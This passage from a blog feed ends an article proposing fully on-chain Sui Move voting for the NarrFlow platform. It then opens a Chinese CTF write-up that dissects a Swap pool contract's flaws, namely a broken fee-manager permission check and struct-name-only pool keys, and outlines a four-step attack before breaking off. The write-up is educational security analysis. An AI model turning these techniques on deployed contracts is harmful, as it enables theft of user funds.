punctuation">,</span> <span class="token constant">MINIMUM_STAKE</span><span class="token punctuation">,</span> ctx<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">create_voter_profile</span><span class="token punctuation">(</span>registry<span class="token punctuation">,</span> voter<span class="token punctuation">,</span> stake<span class="token punctuation">,</span> proof_of_contribution<span class="token punctuation">,</span> ctx<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="Content-Storage-and-Verification"><a href="#Content-Storage-and-Verification" class="headerlink" title="Content Storage and Verification"></a>Content Storage and Verification</h2><h3 id="Decentralized-Content-Management"><a href="#Decentralized-Content-Management" class="headerlink" title="Decentralized Content Management"></a>Decentralized Content Management</h3><p><strong>IPFS Integration:</strong></p><pre class="line-numbers language-typescript" data-language="typescript"><code class="language-typescript"><span class="token comment">// Store large content off-chain, hash on-chain</span><span class="token keyword">class</span> <span class="token class-name">ContentManager</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">async</span> <span class="token function">storeProposal</span><span class="token punctuation">(</span>content<span class="token operator">:</span> <span class="token builtin">string</span><span class="token punctuation">)</span><span class="token operator">:</span> <span class="token builtin">Promise</span><span class="token operator">&lt;</span><span class="token builtin">string</span><span class="token operator">></span> <span class="token punctuation">&#123;</span>        <span class="token comment">// Upload to IPFS</span>        <span class="token keyword">const</span> ipfsHash <span class="token operator">=</span> <span class="token keyword">await</span> <span class="token keyword">this</span><span class="token punctuation">.</span>ipfs<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token comment">// Verify content integrity</span>        <span class="token keyword">const</span> retrieved <span class="token operator">=</span> <span class="token keyword">await</span> <span class="token keyword">this</span><span class="token punctuation">.</span>ipfs<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>ipfsHash<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">assert</span><span class="token punctuation">(</span>retrieved <span class="token operator">===</span> content<span class="token punctuation">,</span> <span class="token string">"Content integrity check failed"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">return</span> ipfsHash<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>        <span class="token keyword">async</span> <span class="token function">submitProposal</span><span class="token punctuation">(</span>content<span class="token operator">:</span> <span class="token builtin">string</span><span class="token punctuation">,</span> sessionId<span class="token operator">:</span> <span class="token builtin">string</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">const</span> contentHash <span class="token operator">=</span> <span class="token keyword">await</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">storeProposal</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">const</span> preview <span class="token operator">=</span> content<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">200</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// First 200 chars on-chain</span>                <span class="token keyword">const</span> tx <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TransactionBlock</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        tx<span class="token punctuation">.</span><span class="token function">moveCall</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>            target<span class="token operator">:</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span><span class="token constant">PACKAGE_ID</span><span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">::voting::submit_proposal</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">,</span>            arguments<span class="token operator">:</span> <span class="token punctuation">[</span>                tx<span class="token punctuation">.</span><span class="token function">object</span><span class="token punctuation">(</span>sessionId<span class="token punctuation">)</span><span class="token punctuation">,</span>                tx<span class="token punctuation">.</span><span class="token function">pure</span><span class="token punctuation">(</span>contentHash<span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token comment">// IPFS hash</span>                tx<span class="token punctuation">.</span><span class="token function">pure</span><span class="token punctuation">(</span>preview<span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token comment">// Preview text</span>                tx<span class="token punctuation">.</span><span class="token function">pure</span><span class="token punctuation">(</span>content<span class="token punctuation">.</span>length<span class="token punctuation">)</span>  <span class="token comment">// Content length for verification</span>            <span class="token punctuation">]</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">return</span> <span class="token keyword">await</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">signAndExecute</span><span class="token punctuation">(</span>tx<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>Content Verification:</strong></p><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust">public <span class="token keyword">struct</span> <span class="token type-definition class-name">Proposal</span> has store<span class="token punctuation">,</span> drop <span class="token punctuation">&#123;</span>    content_hash<span class="token punctuation">:</span> <span class="token class-name">String</span><span class="token punctuation">,</span>      <span class="token comment">// IPFS hash</span>    content_preview<span class="token punctuation">:</span> <span class="token class-name">String</span><span class="token punctuation">,</span>   <span class="token comment">// First 200 characters</span>    content_length<span class="token punctuation">:</span> <span class="token keyword">u64</span><span class="token punctuation">,</span>       <span class="token comment">// Original length for verification</span>    author<span class="token punctuation">:</span> address<span class="token punctuation">,</span>    vote_count<span class="token punctuation">:</span> <span class="token keyword">u64</span><span class="token punctuation">,</span>    quality_score<span class="token punctuation">:</span> <span class="token keyword">u64</span><span class="token punctuation">,</span>        <span class="token comment">// Community-assessed quality</span><span class="token punctuation">&#125;</span><span class="token comment">// Verify content integrity when retrieved</span>public fun <span class="token function">verify_content_integrity</span><span class="token punctuation">(</span>    proposal<span class="token punctuation">:</span> <span class="token operator">&amp;</span><span class="token class-name">Proposal</span><span class="token punctuation">,</span>    full_content<span class="token punctuation">:</span> <span class="token class-name">String</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword">bool</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// Verify length</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token namespace">string<span class="token punctuation">::</span></span><span class="token function">length</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>full_content<span class="token punctuation">)</span> <span class="token operator">!=</span> proposal<span class="token punctuation">.</span>content_length<span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>        <span class="token comment">// Verify preview matches</span>    <span class="token keyword">let</span> preview <span class="token operator">=</span> <span class="token namespace">string<span class="token punctuation">::</span></span><span class="token function">sub_string</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>full_content<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">200</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>preview <span class="token operator">!=</span> proposal<span class="token punctuation">.</span>content_preview<span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>        <span class="token comment">// Hash verification (simplified)</span>    <span class="token keyword">let</span> computed_hash <span class="token operator">=</span> <span class="token function">compute_content_hash</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>full_content<span class="token punctuation">)</span><span class="token punctuation">;</span>    computed_hash <span class="token operator">==</span> proposal<span class="token punctuation">.</span>content_hash<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="Economic-Model-and-Tokenomics"><a href="#Economic-Model-and-Tokenomics" class="headerlink" title="Economic Model and Tokenomics"></a>Economic Model and Tokenomics</h2><h3 id="Multi-Layered-Incentive-System"><a href="#Multi-Layered-Incentive-System" class="headerlink" title="Multi-Layered Incentive System"></a>Multi-Layered Incentive System</h3><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token comment">// Dynamic reward calculation</span>public fun <span class="token function">calculate_rewards</span><span class="token punctuation">(</span>    session<span class="token punctuation">:</span> <span class="token operator">&amp;</span><span class="token class-name">VotingSession</span><span class="token punctuation">,</span>    winner_index<span class="token punctuation">:</span> <span class="token keyword">u64</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token punctuation">(</span><span class="token keyword">u64</span><span class="token punctuation">,</span> <span class="token keyword">u64</span><span class="token punctuation">,</span> <span class="token keyword">u64</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">// (winner_reward, voter_rewards, finalizer_reward)</span>        <span class="token keyword">let</span> base_pool <span class="token operator">=</span> <span class="token constant">BASE_REWARD_PER_SESSION</span><span class="token punctuation">;</span>    <span class="token keyword">let</span> participation_bonus <span class="token operator">=</span> session<span class="token punctuation">.</span>total_votes <span class="token operator">*</span> <span class="token constant">PARTICIPATION_MULTIPLIER</span><span class="token punctuation">;</span>    <span class="token keyword">let</span> quality_bonus <span class="token operator">=</span> <span class="token function">calculate_quality_bonus</span><span class="token punctuation">(</span>session<span class="token punctuation">,</span> winner_index<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">let</span> total_pool <span class="token operator">=</span> base_pool <span class="token operator">+</span> participation_bonus <span class="token operator">+</span> quality_bonus<span class="token punctuation">;</span>        <span class="token comment">// Distribution: 60% winner, 30% voters, 10% finalizer</span>    <span class="token keyword">let</span> winner_reward <span class="token operator">=</span> total_pool <span class="token operator">*</span> <span class="token number">60</span> <span class="token operator">/</span> <span class="token number">100</span><span class="token punctuation">;</span>    <span class="token keyword">let</span> voter_pool <span class="token operator">=</span> total_pool <span class="token operator">*</span> <span class="token number">30</span> <span class="token operator">/</span> <span class="token number">100</span><span class="token punctuation">;</span>    <span class="token keyword">let</span> finalizer_reward <span class="token operator">=</span> total_pool <span class="token operator">*</span> <span class="token number">10</span> <span class="token operator">/</span> <span class="token number">100</span><span class="token punctuation">;</span>        <span class="token punctuation">(</span>winner_reward<span class="token punctuation">,</span> voter_pool<span class="token punctuation">,</span> finalizer_reward<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token comment">// Reputation-based rewards</span>public fun <span class="token function">update_reputation</span><span class="token punctuation">(</span>    profile<span class="token punctuation">:</span> <span class="token operator">&amp;</span><span class="token keyword">mut</span> <span class="token class-name">VoterProfile</span><span class="token punctuation">,</span>    action_type<span class="token punctuation">:</span> <span class="token keyword">u8</span><span class="token punctuation">,</span> <span class="token comment">// 0=proposal_won, 1=good_vote, 2=participation</span>    impact_score<span class="token punctuation">:</span> <span class="token keyword">u64</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">match</span> action_type <span class="token punctuation">&#123;</span>        <span class="token number">0</span> <span class="token operator">=></span> profile<span class="token punctuation">.</span>reputation_score <span class="token operator">+=</span> impact_score <span class="token operator">*</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token comment">// Winning proposals</span>        <span class="token number">1</span> <span class="token operator">=></span> profile<span class="token punctuation">.</span>reputation_score <span class="token operator">+=</span> impact_score<span class="token punctuation">,</span>     <span class="token comment">// Voting for winners</span>        <span class="token number">2</span> <span class="token operator">=></span> profile<span class="token punctuation">.</span>reputation_score <span class="token operator">+=</span> impact_score <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token comment">// Participation</span>        _ <span class="token operator">=></span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="Gas-Optimization-Strategies"><a href="#Gas-Optimization-Strategies" class="headerlink" title="Gas Optimization Strategies"></a>Gas Optimization Strategies</h2><h3 id="Batch-Operations-and-State-Compression"><a href="#Batch-Operations-and-State-Compression" class="headerlink" title="Batch Operations and State Compression"></a>Batch Operations and State Compression</h3><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token comment">// Batch multiple votes in single transaction</span>public entry fun <span class="token function">batch_vote</span><span class="token punctuation">(</span>    sessions<span class="token punctuation">:</span> vector<span class="token operator">&lt;</span><span class="token constant">ID</span><span class="token operator">></span><span class="token punctuation">,</span>    proposals<span class="token punctuation">:</span> vector<span class="token operator">&lt;</span><span class="token keyword">u64</span><span class="token operator">></span><span class="token punctuation">,</span>    ctx<span class="token punctuation">:</span> <span class="token operator">&amp;</span><span class="token keyword">mut</span> <span class="token class-name">TxContext</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">let</span> voter <span class="token operator">=</span> <span class="token namespace">tx_context<span class="token punctuation">::</span></span><span class="token function">sender</span><span class="token punctuation">(</span>ctx<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span>i <span class="token operator">&lt;</span> <span class="token namespace">vector<span class="token punctuation">::</span></span><span class="token function">length</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>sessions<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">let</span> session_id <span class="token operator">=</span> <span class="token operator">*</span><span class="token namespace">vector<span class="token punctuation">::</span></span><span class="token function">borrow</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>sessions<span class="token punctuation">,</span> i<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">let</span> proposal_index <span class="token operator">=</span> <span class="token operator">*</span><span class="token namespace">vector<span class="token punctuation">::</span></span><span class="token function">borrow</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>proposals<span class="token punctuation">,</span> i<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token comment">// Internal vote logic without separate transaction</span>        <span class="token function">execute_vote_internal</span><span class="token punctuation">(</span>session_id<span class="token punctuation">,</span> proposal_index<span class="token punctuation">,</span> voter<span class="token punctuation">)</span><span class="token punctuation">;</span>        i <span class="token operator">=</span> i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>        <span class="token comment">// Single event emission for all votes</span>    <span class="token namespace">event<span class="token punctuation">::</span></span><span class="token function">emit</span><span class="token punctuation">(</span><span class="token class-name">BatchVoteEvent</span> <span class="token punctuation">&#123;</span>        voter<span class="token punctuation">,</span>        sessions<span class="token punctuation">,</span>        proposals<span class="token punctuation">,</span>        timestamp<span class="token punctuation">:</span> <span class="token namespace">tx_context<span class="token punctuation">::</span></span><span class="token function">epoch_timestamp_ms</span><span class="token punctuation">(</span>ctx<span class="token punctuation">)</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">// State compression for historical data</span>public <span class="token keyword">struct</span> <span class="token type-definition class-name">CompressedVotingHistory</span> has key<span class="token punctuation">,</span> store <span class="token punctuation">&#123;</span>    id<span class="token punctuation">:</span> <span class="token constant">UID</span><span class="token punctuation">,</span>    session_summaries<span class="token punctuation">:</span> vector<span class="token operator">&lt;</span><span class="token class-name">SessionSummary</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token comment">// Compressed results only</span>    merkle_root<span class="token punctuation">:</span> vector<span class="token operator">&lt;</span><span class="token keyword">u8</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token comment">// For detailed history verification</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="Migration-Strategy"><a href="#Migration-Strategy" class="headerlink" title="Migration Strategy"></a>Migration Strategy</h2><h3 id="Phased-Decentralization-Approach"><a href="#Phased-Decentralization-Approach" class="headerlink" title="Phased Decentralization Approach"></a>Phased Decentralization Approach</h3><p><strong>Phase 1: Hybrid Validation</strong></p><pre class="line-numbers language-typescript" data-language="typescript"><code class="language-typescript"><span class="token comment">// Run both systems in parallel</span><span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">hybridVote</span><span class="token punctuation">(</span>sessionId<span class="token operator">:</span> <span class="token builtin">string</span><span class="token punctuation">,</span> proposalIndex<span class="token operator">:</span> <span class="token builtin">number</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// Legacy system for immediate feedback</span>    <span class="token keyword">const</span> dbResult <span class="token operator">=</span> <span class="token keyword">await</span> database<span class="token punctuation">.</span><span class="token function">recordVote</span><span class="token punctuation">(</span>sessionId<span class="token punctuation">,</span> proposalIndex<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// Blockchain system for final authority</span>    <span class="token keyword">const</span> blockchainTx <span class="token operator">=</span> <span class="token keyword">await</span> <span class="token function">blockchainVote</span><span class="token punctuation">(</span>sessionId<span class="token punctuation">,</span> proposalIndex<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// Validate consistency</span>    <span class="token keyword">await</span> <span class="token function">validateVoteConsistency</span><span class="token punctuation">(</span>dbResult<span class="token punctuation">,</span> blockchainTx<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>Phase 2: Gradual Migration</strong></p><pre class="line-numbers language-typescript" data-language="typescript"><code class="language-typescript"><span class="token comment">// Feature flags for progressive rollout</span><span class="token keyword">const</span> useBlockchainVoting <span class="token operator">=</span> <span class="token keyword">await</span> featureFlags<span class="token punctuation">.</span><span class="token function">isEnabled</span><span class="token punctuation">(</span><span class="token string">'blockchain_voting'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> useBlockchainTimer <span class="token operator">=</span> <span class="token keyword">await</span> featureFlags<span class="token punctuation">.</span><span class="token function">isEnabled</span><span class="token punctuation">(</span><span class="token string">'blockchain_timer'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>useBlockchainVoting<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">await</span> blockchainVotingService<span class="token punctuation">.</span><span class="token function">vote</span><span class="token punctuation">(</span>sessionId<span class="token punctuation">,</span> proposalIndex<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">await</span> legacyVotingService<span class="token punctuation">.</span><span class="token function">vote</span><span class="token punctuation">(</span>sessionId<span class="token punctuation">,</span> proposalIndex<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>Phase 3: Full Decentralization</strong></p><ul><li>Remove all centralized components</li><li>Archive historical data to IPFS</li><li>Transition to pure blockchain governance</li></ul><h2 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h2><p>The current NarrFlow implementation demonstrates a pragmatic approach to blockchain application development, balancing user experience with decentralization principles. However, the analysis reveals that the centralized components exist not due to fundamental blockchain limitations, but rather as architectural choices prioritizing development speed and familiar patterns.</p><p>Modern Layer1 blockchains possess the technical capabilities to support fully decentralized collaborative storytelling platforms. The proposed improvements would eliminate single points of failure, enhance transparency, and create a truly trustless creative environment while maintaining excellent user experience.</p><p>The path forward involves a measured migration strategy that gradually shifts critical functionality to blockchain-native implementations, ultimately achieving the platform’s stated goal of genuine decentralization in blockchain entertainment.</p><p>This evolution represents more than just technical improvement—it embodies the philosophical shift from treating blockchain as a speculative instrument to leveraging it as a foundation for transparent, democratic digital communities.</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Abstract&quot;&gt;&lt;a href=&quot;#Abstract&quot; class=&quot;headerlink&quot; title=&quot;Abstract&quot;&gt;&lt;/a&gt;Abstract&lt;/h2&gt;&lt;p&gt;For a long time, blockchain technology has bee</summary>
      
    
    
    
    <category term="Web3" scheme="http://example.com/categories/Web3/"/>
    
    
    <category term="Web3" scheme="http://example.com/tags/Web3/"/>
    
  </entry>
  
  <entry>
    <title>SUI MOVE CTF 2025 (Swap) Write Up</title>
    <link href="http://example.com/2025/08/05/MOVE%20CTF%202025%20(5-6)/"/>
    <id>http://example.com/2025/08/05/MOVE%20CTF%202025%20(5-6)/</id>
    <published>2025-08-05T16:17:14.747Z</published>
    <updated>2025-08-05T16:17:19.733Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Sui-Move-CTF-Swap-Challenge-Writeup"><a href="#Sui-Move-CTF-Swap-Challenge-Writeup" class="headerlink" title="Sui Move CTF - Swap Challenge Writeup"></a>Sui Move CTF - Swap Challenge Writeup</h1><h2 id="挑战概述"><a href="#挑战概述" class="headerlink" title="挑战概述"></a>挑战概述</h2><p>这是一个Sui Move智能合约CTF挑战，目标是攻击一个流动性池合约，让合约中所有代币余额与累计手续费之和为零，从而获得Flag。</p><h3 id="挑战信息"><a href="#挑战信息" class="headerlink" title="挑战信息"></a>挑战信息</h3><ul><li><strong>Package ID</strong>: <code>0xa4ed91928b7eb37e7bed0e8bea09dfcccb8a5ae41b908ebb222701c637294e1a</code></li><li><strong>部署交易</strong>: <code>2CDJQ1PTg4iE1JZPxmcZuxV2SqFgprMWhwkEA6x6hURM</code></li><li><strong>Pools对象ID</strong>: <code>0x2412efd0b085591054c9ea6432bce9a6f1a98dcd55400a64f913c1489e962001</code></li></ul><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>通过分析合约代码，我发现了三个关键漏洞：</p><h3 id="漏洞1-权限控制错误-Critical"><a href="#漏洞1-权限控制错误-Critical" class="headerlink" title="漏洞1: 权限控制错误 (Critical)"></a>漏洞1: 权限控制错误 (Critical)</h3><p><strong>位置</strong>: <code>set_fee_manager</code>函数 (第225行)</p><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust">public entry fun <span class="token function">set_fee_manager</span><span class="token punctuation">(</span>pools<span class="token punctuation">:</span> <span class="token operator">&amp;</span><span class="token keyword">mut</span> <span class="token class-name">Pools</span><span class="token punctuation">,</span> new_fee_manager<span class="token punctuation">:</span> address<span class="token punctuation">,</span> ctx<span class="token punctuation">:</span> <span class="token operator">&amp;</span><span class="token keyword">mut</span> <span class="token class-name">TxContext</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token macro property">assert!</span><span class="token punctuation">(</span><span class="token namespace">tx_context<span class="token punctuation">::</span></span><span class="token function">sender</span><span class="token punctuation">(</span>ctx<span class="token punctuation">)</span> <span class="token operator">==</span> new_fee_manager<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// 错误的权限检查</span>    pools<span class="token punctuation">.</span>fee_manager <span class="token operator">=</span> new_fee_manager<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><strong>问题</strong>: 检查的是调用者是否等于新的fee_manager，而不是检查调用者是否是当前的fee_manager。</p><p><strong>影响</strong>: 任何人都可以将自己设置为fee_manager。</p><h3 id="漏洞2-池子键值生成不安全-High"><a href="#漏洞2-池子键值生成不安全-High" class="headerlink" title="漏洞2: 池子键值生成不安全 (High)"></a>漏洞2: 池子键值生成不安全 (High)</h3><p><strong>位置</strong>: <code>get_struct</code>函数 (第149行)</p><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust">fun get_struct<span class="token operator">&lt;</span><span class="token class-name">X</span><span class="token operator">></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token class-name">String</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">let</span> type_name <span class="token operator">=</span> <span class="token namespace">type_name<span class="token punctuation">::</span></span>get<span class="token operator">&lt;</span><span class="token class-name">X</span><span class="token operator">></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">let</span> address_part <span class="token operator">=</span> type_name<span class="token punctuation">.</span><span class="token function">get_address</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">let</span> module_part <span class="token operator">=</span> type_name<span class="token punctuation">.</span><span class="token function">get_module</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">let</span> full <span class="token operator">=</span> type_name<span class="token punctuation">.</span><span class="token function">borrow_string</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    type_name<span class="token punctuation">.</span><span class="token function">borrow_string</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span>address_part <span class="token operator">+</span> module_part <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">,</span> full<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>问题</strong>: 只使用结构体名称生成池子键值，不包含完整的类型路径。</p><p><strong>影响</strong>: 可以通过创建同名的假代币来混淆池子操作。</p><h3 id="漏洞3-is-solved条件可被绕过"><a href="#漏洞3-is-solved条件可被绕过" class="headerlink" title="漏洞3: is_solved条件可被绕过"></a>漏洞3: is_solved条件可被绕过</h3><p><strong>位置</strong>: <code>is_solved</code>函数 (第246行)</p><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust">public entry fun <span class="token function">is_solved</span><span class="token punctuation">(</span>pools<span class="token punctuation">:</span> <span class="token operator">&amp;</span><span class="token keyword">mut</span> <span class="token class-name">Pools</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">let</span> sum <span class="token operator">=</span> get_balance<span class="token operator">&lt;</span><span class="token constant">TOKEN1</span><span class="token operator">></span><span class="token punctuation">(</span>pools<span class="token punctuation">)</span> <span class="token operator">+</span> get_balance<span class="token operator">&lt;</span><span class="token constant">TOKEN2</span><span class="token operator">></span><span class="token punctuation">(</span>pools<span class="token punctuation">)</span> <span class="token operator">+</span>               get_balance<span class="token operator">&lt;</span><span class="token constant">TOKEN3</span><span class="token operator">></span><span class="token punctuation">(</span>pools<span class="token punctuation">)</span> <span class="token operator">+</span> get_balance<span class="token operator">&lt;</span><span class="token constant">TOKEN4</span><span class="token operator">></span><span class="token punctuation">(</span>pools<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">let</span> fee_sum <span class="token operator">=</span> get_total_fee<span class="token operator">&lt;</span><span class="token constant">TOKEN1</span><span class="token punctuation">,</span> <span class="token constant">TOKEN2</span><span class="token operator">></span><span class="token punctuation">(</span>pools<span class="token punctuation">)</span> <span class="token operator">+</span> get_total_fee<span class="token operator">&lt;</span><span class="token constant">TOKEN3</span><span class="token punctuation">,</span> <span class="token constant">TOKEN4</span><span class="token operator">></span><span class="token punctuation">(</span>pools<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token macro property">assert!</span><span class="token punctuation">(</span>sum <span class="token operator">+</span> fee_sum <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// 发出Flag事件</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>问题</strong>: 如果创建空的池子，所有余额和手续费都为0，条件自然满足。</p><h2 id="攻击策略"><a href="#攻击策略" class="headerlink" title="攻击策略"></a>攻击策略</h2><p>基于发现的漏洞，制定了以下攻击策略：</p><ol><li><strong>利用权限漏洞</strong>: 调用<code>set_fee_manager</code>将自己设置为fee_manager</li><li><strong>创建假代币结构体</strong>: 利用键值生成漏洞，创建同名的假TOKEN结构体</li><li><strong>创建空池子</strong>: 使用假代币创建空的池子，使余额和手续费都为0</li><li><strong>触发Flag</strong>: 调用<code>is_solved</code>函数获得Flag</li></ol><h2 